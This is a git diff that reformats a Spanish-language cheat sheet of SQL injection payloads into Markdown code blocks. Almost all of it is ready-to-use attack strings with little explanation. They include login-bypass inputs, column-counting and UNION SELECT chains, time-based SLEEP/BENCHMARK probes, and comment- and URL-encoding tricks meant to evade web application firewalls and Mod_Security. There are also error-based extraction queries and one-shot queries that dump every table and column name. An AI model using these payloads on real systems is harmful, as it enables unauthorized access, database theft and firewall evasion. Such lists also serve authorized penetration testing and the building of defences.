@@ -1,5 +1,8 @@
-**sql injection
-Payloads para sql inyection login bypass**
+# sql injection 
+
+## Payloads para sql inyection login bypass
+
+```
 '-'
 ' '
 '&'
@@ -50,17 +53,20 @@ admin") or "1"="1
 admin") or "1"="1"--
 admin") or "1"="1"#
 admin") or "1"="1"/*
+```
 
-Ejemplos de payloads sql injection
-Detectar un error sql
+## Ejemplos de payloads sql injection
 
+### Detectar un error sql 
+```
 ' = %27
 " = %22
 # = %23
 ; = %3B
+```
 
-Detectar numero de columnas vulnerables
-
+### Detectar numero de columnas vulnerables 
+```
  ORDER BY 1-- 
  ORDER BY 2-- 
  ORDER BY 3-- 
@@ -83,8 +89,11 @@ Detectar numero de columnas vulnerables
  ORDER BY 9# 
  ORDER BY 10# 
 
-Union Select Payloads
+```
 
+### Union Select Payloads
+
+```
  UNION SELECT 1
  UNION SELECT 1,2
  UNION SELECT 1,2,3
@@ -126,7 +135,11 @@ Union Select Payloads
  AND 1 UNION SELECT 1,2,3,4,5,6,7
 
 
-Union Select + sleep() + BENCHMARK(1000000,MD5('A')) Payloads
+```
+
+### Union Select + sleep() + BENCHMARK(1000000,MD5('A')) Payloads
+
+```
  UNION SELECT @@VERSION,SLEEP(5),3
  UNION SELECT @@VERSION,SLEEP(5),USER(),4
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
@@ -134,8 +147,12 @@ Union Select + sleep() + BENCHMARK(1000000,MD5('A')) Payloads
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
  
-tecnicas para hacer bypass en sql inyection
-bypass usando comentarios
+```
+
+### tecnicas para hacer bypass en sql inyection 
+
+#### bypass usando comentarios
+```
  /*!UNION*/ /*!SELECT*/ 1
  /*!UNION*/ /*!SELECT*/ 1,2
  /*!UNION*/ /*!SELECT*/ 1,2,3
@@ -160,7 +177,9 @@ bypass usando comentarios
  /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6)
  /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6,7)
 
-bypass usando comentarios + url encoding
+```
+#### bypass usando comentarios + url encoding 
+```
  /*!%55nion*/%20/*!%53elect*/1
  /*!%55nion*/%20/*!%53elect*/%201,2
  /*!%55nion*/%20/*!%53elect*/%201,2,3
@@ -185,14 +204,24 @@ bypass usando comentarios + url encoding
  /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6)
  /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6,7)
 
-Information_schema.tables
+```
+
+
+
+### Information_schema.tables 
+
+```
 /*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
 /*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
 /*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
 /*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
 /*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
 /*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
-Concat
+```
+
+### Concat
+
+```
 CoNcAt()
 concat() 
 CON%08CAT()
@@ -203,7 +232,11 @@ CoNcAt()
 unhex(hex(concat(table_name)))
 unhex(hex(/*!12345concat*/(table_name)))
 unhex(hex(/*!50000concat*/(table_name)))
-group_concat
+```
+
+### group_concat
+
+```
 /*!group_concat*/()
 gRoUp_cOnCAt()
 group_concat(/*!*/)
@@ -231,7 +264,12 @@ convert(group_concat(/*!12345table_name*/)+using+ascii)
 convert(group_concat(/*!50000table_name*/)+using+ascii)
 CONVERT(group_concat(table_name)+USING+latin1)
 
-Union Select
+```
+
+
+### Union Select
+
+```
 /*!50000%55nIoN*/ /*!50000%53eLeCt*/
 %55nion(%53elect 1,2,3)-- -
 +union+distinct+select+
@@ -322,7 +360,10 @@ un?<ion sel="">+un/**/ion+se/**/lect+
 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
 /*!UnIoN*/SeLecT+
 
-HTML URL Encode (Codificación Url)
+```
+### HTML URL Encode (Codificación Url)
+
+```
 union select:
 
 u	= %75
@@ -337,7 +378,10 @@ l	= %6c
 c	= %63
 t	= %74
 
-Sql payloads
+```
+### Sql payloads 
+
+```
 /**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+
 
 +/*!50000%55nIoN*/+/*!50000%53eLeCt*/+
@@ -360,52 +404,83 @@ SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*
 
 +union(select+1,2,3,database(),concat(hash,0x3a,hash),6..+from(columna))+--+
 
-Inyecciónes sql usando funciones sql
-Sql inyection payload usando la función RPAD y SOUNDS LIKE
-SELECT RPAD(table_name,50,'.') from information_schema.tables where table_schema sounds like database()
+```
 
-Sql inyection payload usando upper + reverse + right + sounds like para extraer información
-select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()
 
-Sql inyection usando elt, doble Reverse, hex y unhex
-Select unhex(hex(reverse(reverse(elt(1, table_Name))))) from information_schema.tables
+## Inyecciónes sql usando funciones sql
 
-Sql inyection case
+### Sql inyection payload usando la función RPAD y SOUNDS LIKE 
+
+`SELECT RPAD(table_name,50,'.') from information_schema.tables where table_schema sounds like database()`
+
+### Sql inyection payload usando upper + reverse + right + sounds like para extraer información  
+
+`select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()`
+
+### Sql inyection usando elt, doble Reverse, hex y unhex
+
+`Select unhex(hex(reverse(reverse(elt(1, table_Name))))) from information_schema.tables`
+
+### Sql inyection case
+
+```
 SELECT CASE WHEN (1=1) THEN table_name ELSE '<a href=https://twitter.com/_Y000_>_Y00!_</a>' END from information_schema.tables
 
 SELECT CASE 4 WHEN 1 THEN database() WHEN 2 THEN @@version WHEN 3 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
 
 SELECT CASE WHEN 1>0 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
-SQL IF Function
+```
+
+### SQL IF Function
+
+```
 SELECT IF(STRCMP('1','1'),'_Y000!_',table_name) FROM information_schema.tables
 
 select IF(MID(@@version,1,1)='5',table_name,'_Y000!_') from information_schema.tables
-SQL IFNULL
+```
+
+### SQL IFNULL
+
+```
 SELECT IFNULL(1+1/0,table_name) FROM information_schema.tables
-SQL NULLIF
+```
+
+### SQL NULLIF
+
+```
 SELECT NULLIF(table_name,2) from information_schema.tables
-Sql inyection payload usando upper + reverse + right + sounds like
-select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()
+```
 
-SQL injection usando doble reverse + right + if statement + HTML injection
-SELECT reverse(reverse(right(if(1=1,table_name,'<h3><font color=blue> Tablas:</h3>'),100))) from information_schema.tables
+### Sql inyection payload usando upper + reverse + right + sounds like
 
-Sql inyection usando las funciones HEX-UNHEX
-SELECT UNHEX(HEX(table_name))from information_schema.tables
+`select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()`
 
-Inyección sql tipo error based usando Extractvalue
-1%20and+extractvalue(rand(),concat(0x7e,version(),0x7e,user()))--
+### SQL injection usando doble reverse + right + if statement + HTML injection
 
-Sql inyection payload usando reverse
-reverse(right(reverse(data),1))
+`SELECT reverse(reverse(right(if(1=1,table_name,'<h3><font color=blue> Tablas:</h3>'),100))) from information_schema.tables`
 
-Sql inyection payload usando extractvalue
-extractvalue(rand(),concat(CHAR(126),database(),CHAR(126)))
+### Sql inyection usando las funciones HEX-UNHEX
 
-Sql inyection payload + url encode + timing
--7 %23%0AAND 0--%0A /*!12345UNION*/ /*!12345ALL*/ (/*!12345SELECT*/ 1,sleep(5),'soy vulnerable',BENCHMARK(1000000,MD5('true')),5,6,7,8,9,10,11,12,13)
+`SELECT UNHEX(HEX(table_name))from information_schema.tables`
 
-JSON Generation Functions
+### Inyección sql tipo error based usando Extractvalue
+
+`1%20and+extractvalue(rand(),concat(0x7e,version(),0x7e,user()))--`
+
+### Sql inyection payload usando reverse
+
+`reverse(right(reverse(data),1))`
+
+### Sql inyection payload usando extractvalue
+
+`extractvalue(rand(),concat(CHAR(126),database(),CHAR(126)))`
+
+### Sql inyection payload + url encode + timing  
+
+`-7 %23%0AAND 0--%0A /*!12345UNION*/ /*!12345ALL*/ (/*!12345SELECT*/ 1,sleep(5),'soy vulnerable',BENCHMARK(1000000,MD5('true')),5,6,7,8,9,10,11,12,13)`
+
+### JSON Generation Functions
+```
 select JSON_OBJECT(1, @@version)
 
 select json_array(current_user())
@@ -414,7 +489,11 @@ select json_objectagg(1, @@datadir)
 
 select json_arrayagg('_Y000!_')
 
-Mezclas
+```
+
+## Mezclas
+
+```
 select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))
 
 SELECT * FROM  information_schema.tables WHERE `table_name` REGEXP 'admin'
@@ -453,16 +532,25 @@ select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()
 
 SELECT 0 FROM (SELECT count(*), CONCAT((SELECT @@version), 0x23, FLOOR(RAND(0)*4)) AS Y000 FROM information_schema.tables GROUP BY Y000) x
 
-Sql inyection + dios sql
+```
+
+## Sql inyection + dios sql
+
+```
 /*!u%6eion*/ /*!se%6cect*/+1,concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,'<br>',table_name,'::',column_name)),@),3..
 
 (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)
 
 CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=information_schema)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,table_name,0x3c62723e))))x))
-Sql inyection Buffer Overflow / Firewall Crash bypass + xss inyection
-+and+(select%201)=(Select%200xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....)+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,....+--+
+```
 
-sql inyection payload+ bypass Mod_Security
+### Sql inyection Buffer Overflow / Firewall Crash bypass + xss inyection
+
+`+and+(select%201)=(Select%200xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....)+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,....+--+`
+
+### sql inyection payload+ bypass Mod_Security 
+
+```
 /*!50000un0x696fn*/+/*!12345AlL*/(/*!50000se0x6c65ct*/+1)+--+
 
 /*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4...
@@ -471,8 +559,15 @@ sql inyection payload+ bypass Mod_Security
 
 /*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)+--+
 
-Sql inyection payload + comment + hex/unhex
-/*!50000select*/unhex(hex(/*!12345concat*/(0x223e,version(),0x223e,database())))
+```
 
-Sql inyection payload + url encode
-+/*!12120%55%6e%49%6f%4e*/+(%53%65%4c%65%43%74+111,222,333,database(),555,...)+--+
+### Sql inyection payload + comment + hex/unhex
+
+`/*!50000select*/unhex(hex(/*!12345concat*/(0x223e,version(),0x223e,database())))`
+
+### Sql inyection payload + url encode 
+
+`+/*!12120%55%6e%49%6f%4e*/+(%53%65%4c%65%43%74+111,222,333,database(),555,...)+--+`
+
+
+
